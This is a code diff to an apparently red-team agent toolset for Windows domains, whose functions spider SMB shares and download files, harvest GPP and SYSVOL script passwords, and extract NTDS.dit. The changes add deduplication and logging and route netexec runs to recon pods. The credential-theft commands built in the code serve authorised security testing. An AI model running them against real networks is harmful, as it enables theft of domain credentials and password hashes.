@@ -7,12 +7,12 @@ This module provides tools for:
 - Extracting NTDS.dit database
 """
 
-import logging
 import re
 from typing import Any, ClassVar
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
+from loguru import logger
 
 from ares.core.models import Credential
 from ares.tools.red.common import (
@@ -24,8 +24,6 @@ from ares.tools.red.common import (
     run_tool,
     store_remote_artifact,
 )
-
-logger = logging.getLogger(__name__)
 
 
 class SharePilferingTools(Toolset):
@@ -99,11 +97,22 @@ class SharePilferingTools(Toolset):
             List of interesting files found
 
         Example:
-            >>> smbclient_spider("192.168.58.10", "SYSVOL", "user", "pass", "domain.local")
+            >>> smbclient_spider("192.168.58.10", "SYSVOL", "user", "pass", "contoso.local")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
             return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # Deduplication: check if this target/share/credential combo was already spidered
+        if self.state and hasattr(self.state, "processed_spidered_shares"):
+            spider_key = (
+                f"{target.lower()}:{share.lower()}:{username.lower()}:{(domain or '').lower()}"
+            )
+            if spider_key in self.state.processed_spidered_shares:
+                return (
+                    f"[*] Already spidered {share} on {target} with {domain}\\{username} - skipping"
+                )
+            self.state.processed_spidered_shares.add(spider_key)
 
         cmd = [
             "netexec",
@@ -119,16 +128,17 @@ class SharePilferingTools(Toolset):
             "spider_plus",
             "-o",
             "DOWNLOAD_FLAG=True",  # Enable file downloads
-            "MAX_FILE_SIZE=100KB",  # Download files up to 100KB
+            "MAX_FILE_SIZE=102400",  # Download files up to 100KB (in bytes)
         ]
 
         try:
             logger.info(f"[*] Spidering share {share} on {target} with downloads enabled")
-            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300, target_role="recon")
 
             result = stdout + "\n" + (stderr or "")
 
-            # Fetch spider JSON metadata from recon pod (spider_plus runs on recon)
+            # Fetch spider JSON metadata from local filesystem
             import json
 
             spider_dir = "/root/.nxc/modules/nxc_spider_plus"
@@ -136,8 +146,8 @@ class SharePilferingTools(Toolset):
 
             downloaded_content = []
 
-            # Fetch the JSON metadata from recon pod
-            json_bytes = fetch_remote_file(json_file, target_role="recon", timeout_seconds=30)
+            # Fetch the JSON metadata locally
+            json_bytes = fetch_remote_file(json_file, target_role=None, timeout_seconds=30)
             if json_bytes:
                 try:
                     spider_data = json.loads(json_bytes.decode("utf-8", errors="ignore"))
@@ -150,13 +160,13 @@ class SharePilferingTools(Toolset):
                                     isinstance(file_info, dict)
                                     and file_info.get("size", 0) < 102400
                                 ):  # <100KB
-                                    # Fetch downloaded file from recon pod
+                                    # Fetch downloaded file locally
                                     # spider_plus downloads to: spider_dir/IP/SHARE/path
                                     clean_path = file_path.lstrip("/\\").replace("\\", "/")
                                     dl_path = f"{spider_dir}/{target}/{share_name}/{clean_path}"
 
                                     file_bytes = fetch_remote_file(
-                                        dl_path, target_role="recon", timeout_seconds=30
+                                        dl_path, target_role=None, timeout_seconds=30
                                     )
                                     if file_bytes:
                                         try:
@@ -276,7 +286,7 @@ class SharePilferingTools(Toolset):
             Decrypted GPP passwords if found
 
         Example:
-            >>> gpp_password_finder("192.168.58.10", "user", "pass", "domain.local")
+            >>> gpp_password_finder("192.168.58.10", "user", "pass", "contoso.local")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -298,7 +308,8 @@ class SharePilferingTools(Toolset):
 
         try:
             logger.info(f"[*] Searching for GPP passwords in {domain}")
-            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180, target_role="recon")
 
             result = stdout + "\n" + (stderr or "")
 
@@ -341,11 +352,20 @@ class SharePilferingTools(Toolset):
             Scripts containing potential credentials
 
         Example:
-            >>> sysvol_script_search("192.168.58.10", "user", "pass", "domain.local")
+            >>> sysvol_script_search("192.168.58.10", "user", "pass", "contoso.local")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
             return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # Deduplication: check if SYSVOL was already searched with this credential
+        if self.state and hasattr(self.state, "processed_spidered_shares"):
+            spider_key = f"{target.lower()}:sysvol:{username.lower()}:{(domain or '').lower()}"
+            if spider_key in self.state.processed_spidered_shares:
+                return (
+                    f"[*] Already searched SYSVOL on {target} with {domain}\\{username} - skipping"
+                )
+            self.state.processed_spidered_shares.add(spider_key)
 
         results: list[str] = []
 
@@ -447,7 +467,8 @@ class SharePilferingTools(Toolset):
                         results.append(f"\n📄 {script_file}:\n{grep_output}")
 
             # Also use netexec's spider to find any files with passwords
-            stdout, stderr, _ = run_tool(spider_cmd, timeout_seconds=300)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _ = run_tool(spider_cmd, timeout_seconds=300, target_role="recon")
             spider_output = stdout + "\n" + (stderr or "")
 
             # Combine results
@@ -557,7 +578,7 @@ class SharePilferingTools(Toolset):
             NTDS extraction results
 
         Example:
-            >>> ntds_dit_extract("192.168.58.10", "Administrator", password="P@ss", domain="domain.local")  # pragma: allowlist secret
+            >>> ntds_dit_extract("192.168.58.10", "Administrator", password="P@ss", domain="contoso.local")  # pragma: allowlist secret
         """
         resolved_password = self._resolve_password(username, domain, password)
         if (
